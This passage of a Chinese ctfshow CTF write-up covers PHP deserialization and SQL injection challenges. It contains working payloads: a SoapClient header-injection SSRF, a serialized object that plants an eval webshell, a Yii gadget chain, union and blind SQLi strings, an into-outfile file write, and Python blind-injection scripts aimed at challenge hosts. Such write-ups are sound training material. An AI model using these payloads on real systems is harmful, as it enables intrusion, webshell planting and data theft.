class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="variable">$ua</span>));</span><br><span class="line"><span class="variable">$client</span>-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br></pre></td></tr></table></figure><p><img src="/posts/23601/web259.png" alt="web259"></p><p>因此我们注入user-agent,修改Content-Type:</p><ol><li>text开头<ol><li>text&#x2F;html： HTML格式</li><li>text&#x2F;plain：纯文本格式</li><li>text&#x2F;xml： XML格式</li></ol></li><li>图片格式<ol><li>image&#x2F;gif ：gif 图片格式</li><li>image&#x2F;jpeg ：jpg 图片格式</li><li>image&#x2F;png：png 图片格式</li></ol></li><li>application开头<ol><li>application&#x2F;xhtml+xml：XHTML 格式</li><li>application&#x2F;xml：XML 数据格式</li><li>application&#x2F;atom+xml：Atom XML 聚合格式</li><li>application&#x2F;json：JSON 数据格式</li><li>application&#x2F;pdf：pdf 格式</li><li>application&#x2F;msword：Word 文档格式</li><li>application&#x2F;octet-stream：二进制流数据（如常见的文件下载）</li><li>application&#x2F;x-www-form-urlencoded：表单发送默认格式</li></ol></li><li>媒体文件<ol><li>audio&#x2F;x-wav：wav文件</li><li>audio&#x2F;x-ms-wma：w文件</li><li>audio&#x2F;mp3：mp3文件</li><li>video&#x2F;x-ms-wmv：wmv文件</li><li>video&#x2F;mpeg4：mp4文件</li><li>video&#x2F;avi：avi文件</li></ol></li></ol><p>构造出的payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ua</span>=<span class="string">&quot;aaa\r\nX-Forwarded-For:127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow&quot;</span>;</span><br><span class="line"><span class="variable">$client</span>=<span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1/&#x27;</span>,<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="variable">$ua</span>));</span><br><span class="line"><span class="comment">//$client-&gt;getFlag();</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$client</span>));</span><br></pre></td></tr></table></figure><h2 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h2><p>读源码构造code满足弱类型比较将字符串写入877.php(0x36d就是877)</p><p>exp如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class ctfshowvip&#123;</span><br><span class="line">  public $username;</span><br><span class="line">  public $password;</span><br><span class="line">  public $code;</span><br><span class="line"></span><br><span class="line">  public function __construct($u=&#x27;&#x27;,$p=&#x27;&#x27;)&#123;</span><br><span class="line">    $this-&gt;username=&quot;877.php&quot;;</span><br><span class="line">    $this-&gt;password=&#x27;&lt;?=eval($_GET[&quot;zzz&quot;]);&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new ctfshowvip();</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure><h2 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h2><p>字符串逃逸，要抛弃多少字符就写多少个f*ck</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//echo serialize($umsg);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//s:271:&quot;O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:145:&quot;loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;</span></span><br></pre></td></tr></table></figure><p><code>payload:?f=a&amp;m=b&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;</code></p><h2 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;&lt;?php system(&quot;cat flag.php&quot;) ?&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;|&#x27;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>))));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用php解析差异构造反序列化，从而使得该对象执行__destruct()</p><h2 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h2><p>借用php的引用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = [<span class="string">&quot;sss&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshowAdmin</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;password=&amp;<span class="variable">$a</span>-&gt;token;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h2 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h2><p>因为是伪协议直接读取，所以直接将序列化的类传入即可触发__destruct()</p><p>因为有过滤但是大小写不敏感所以将类名更改为ctFshow</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctFshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctFshow</span>())</span><br></pre></td></tr></table></figure><h2 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h2><p>yii框架漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-sql注入</title>
      <link href="/posts/30170/"/>
      <url>/posts/30170/</url>
      
        <content type="html"><![CDATA[<blockquote><h6 id="PayloadList"><a href="#PayloadList" class="headerlink" title="PayloadList"></a>PayloadList</h6></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#联合查询</span></span><br><span class="line">-<span class="number">1</span><span class="string">&#x27; union select password,2 from ctfshow_user2 where username=&quot;flag&quot;--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#二态联合查询盲注</span></span><br><span class="line"><span class="string">?id=&#x27;</span> union select <span class="string">&#x27;a&#x27;</span>,<span class="keyword">if</span>(<span class="built_in">ascii</span>(substr((select group_concat(password) <span class="keyword">from</span> ctfshow_user4 where username=<span class="string">&#x27;flag&#x27;</span>),%d,<span class="number">1</span>))&lt;%d,<span class="string">&#x27;xiao&#x27;</span>,<span class="string">&#x27;da&#x27;</span>)--+</span><br><span class="line"></span><br><span class="line"><span class="comment">#时间盲注</span></span><br><span class="line">?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; and 1=if(ascii(substr((select group_concat(password) from ctfshow_user5 where username=&#x27;</span>flag<span class="string">&#x27;),%d,1))&lt;%d,sleep(3),1)--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#读写文件语句（into outfile &#x27;</span>/var/www/html/<span class="number">1.</span>txt<span class="string">&#x27;）</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> union select <span class="number">1</span>,password <span class="keyword">from</span> ctfshow_user5 into outfile <span class="string">&#x27;/var/www/html/1.txt&#x27;</span>--+</span><br><span class="line"></span><br><span class="line"><span class="comment">#过滤参数</span></span><br><span class="line"><span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;or(id=26)and&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>       <span class="comment">#(引号闭合)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#md5($_POST[&#x27;password&#x27;],true);绕过</span></span><br><span class="line">md5(ffifdyop)=<span class="string">&quot;&#x27;or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#数字限制</span></span><br><span class="line">SELECT * FROM ctfshow_user WHERE username = <span class="number">0</span>;可以匹配所有字母开头</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="web-171"><a href="#web-171" class="headerlink" title="web-171"></a>web-171</h2><p>这里共有两种办法</p><p>一种是按部就班查数据名、查表名、查列名逐级查询后爆破：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7afb9059-bf03-4d0f-bc39-5df7a714a28b.challenge.ctf.show/api/&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">choice=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;输入选项&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        <span class="keyword">if</span>(choice==<span class="number">1</span>):</span><br><span class="line">            payload = url+<span class="string">&quot;?id=1&#x27; and ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;--+&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="keyword">elif</span>(choice==<span class="number">2</span>):</span><br><span class="line">            payload = url+<span class="string">&quot;?id=1&#x27; and (ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctfshow_web&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)--+&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            <span class="comment">#ctfshow_user</span></span><br><span class="line">        <span class="keyword">elif</span>(choice==<span class="number">3</span>):</span><br><span class="line">            payload = url+<span class="string">&quot;?id=1&#x27; and (ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;ctfshow_user&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)--+&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            <span class="comment">#id,username,password</span></span><br><span class="line">        <span class="keyword">elif</span>(choice==<span class="number">4</span>):</span><br><span class="line">            payload = url+<span class="string">&quot;?id=1&#x27; and (ascii(substr((select(group_concat(password))from(ctfshow_user)),&#123;&#125;,1))&gt;&#123;&#125;)--+&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            <span class="comment">#admin,111,222,pass...</span></span><br><span class="line">        <span class="built_in">print</span>(mid)</span><br><span class="line">        res = requests.get(url=payload)</span><br><span class="line">        <span class="comment">#print(res.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">            <span class="comment">#print(chr(mid))</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid ==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>另一种是使得查询式恒等，即如下所示：</p><p><code>-1&#39; or 1--+</code></p><p><img src="/posts/30170/web-171-1.jpg" alt="web-171-1"></p><h2 id="web-172"><a href="#web-172" class="headerlink" title="web-172"></a>web-172</h2><p>第二关过滤了查询结果，我们可以使用联合查询进行测试：</p><p><code>-1&#39; union select 1,2--+</code></p><p><img src="/posts/30170/web-172-1.jpg" alt="web-172-1"></p><p><code>-1&#39; union select password,2 from ctfshow_user2 where username=&quot;flag&quot;--+</code></p><p><img src="/posts/30170/web-172-2.jpg" alt="web-172-2"></p><h2 id="web-173"><a href="#web-173" class="headerlink" title="web-173"></a>web-173</h2><p>比第二关联合查询多了个列</p><p><code>-1&#39; union select 1,password,2 from ctfshow_user3 where username=&quot;flag&quot;--+</code></p><h2 id="web-174"><a href="#web-174" class="headerlink" title="web-174"></a>web-174</h2><p>这个多少有点坑，把过滤结果中的数字给屏蔽了，flag中虽然没有flag,但是终究还是有数字的呀。因此可以选择盲注，用if来判定，自己设定二态来交给程序判断。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://aeecaff5-8ba4-459a-ac8a-cc6e4fefe910.challenge.ctf.show/api/v4.php&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">max</span>=<span class="number">128</span></span><br><span class="line">    <span class="built_in">min</span>=<span class="number">32</span> </span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        middle=<span class="built_in">min</span>+((<span class="built_in">max</span>-<span class="built_in">min</span>)//<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">min</span>==middle:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(middle)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        payload=<span class="string">&quot;?id=&#x27; union select &#x27;a&#x27;,if(ascii(substr((select group_concat(password) from ctfshow_user4 where username=&#x27;flag&#x27;),%d,1))&lt;%d,&#x27;xiao&#x27;,&#x27;da&#x27;) -- -&quot;</span>%(i,middle)</span><br><span class="line">        res=requests.get(url=url+payload).text</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;xiao&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">            <span class="built_in">max</span>=middle</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span>=middle</span><br></pre></td></tr></table></figure><h2 id="web-175"><a href="#web-175" class="headerlink" title="web-175"></a>web-175</h2><p>这波直接过滤了所有的ASCII字符，不知道可不可以用其他的字符，没试过。</p><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>可以用时间盲注，修改一下上面的脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;http://82091de5-a7af-43c0-91c5-0bfe2331754c.challenge.ctf.show/api/v5.php&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">max</span>=<span class="number">128</span></span><br><span class="line">    <span class="built_in">min</span>=<span class="number">32</span> </span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        middle=<span class="built_in">min</span>+((<span class="built_in">max</span>-<span class="built_in">min</span>)//<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">min</span>==middle:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(middle)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        payload=<span class="string">&quot;?id=1&#x27; and 1=if(ascii(substr((select group_concat(password) from ctfshow_user5 where username=&#x27;flag&#x27;),%d,1))&lt;%d,sleep(3),1) -- -&quot;</span>%(i,middle)</span><br><span class="line">        start_time0 = time.time()</span><br><span class="line">        res=requests.get(url=url+payload)</span><br><span class="line">        <span class="keyword">if</span>(time.time() - start_time0&gt;<span class="number">3</span>):</span><br><span class="line">            <span class="built_in">max</span>=middle</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span>=middle</span><br></pre></td></tr></table></figure><h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>使用读写文件语句</p><p><code>?id=1&#39; union select 1,password from ctfshow_user5 into outfile &#39;/var/www/html/1.txt&#39;--+</code></p><p>之后查看相应站点的1.txt</p><h2 id="web-176"><a href="#web-176" class="headerlink" title="web-176"></a>web-176</h2><p>万能密码不解释</p><p><code>1&#39; or 1=1--+</code></p><h2 id="web-177"><a href="#web-177" class="headerlink" title="web-177"></a>web-177</h2><p>“–+”,“ ”疑似被过滤</p><p><code>1&#39;||1=1%23</code></p><h2 id="web-178"><a href="#web-178" class="headerlink" title="web-178"></a>web-178</h2><p>同上，不知道过滤了什么</p><h2 id="web-179"><a href="#web-179" class="headerlink" title="web-179"></a>web-179</h2><p>同上</p><h2 id="web-180-182"><a href="#web-180-182" class="headerlink" title="web-180~182"></a>web-180~182</h2><p><code>id=-1&#39;or(id=26)and&#39;1&#39;=&#39;1</code></p><p>这个倒是第一次见，全句是</p><p><code>select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;id=-1&#39;or(id=26)and&#39;1&#39;=&#39;1&#39; limit 1;</code></p><p>绝妙的引号闭合</p><h2 id="web-183"><a href="#web-183" class="headerlink" title="web-183"></a>web-183</h2><p>post过滤，只给了表名的注入点，不知所云，waf有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;, $str);</span><br><span 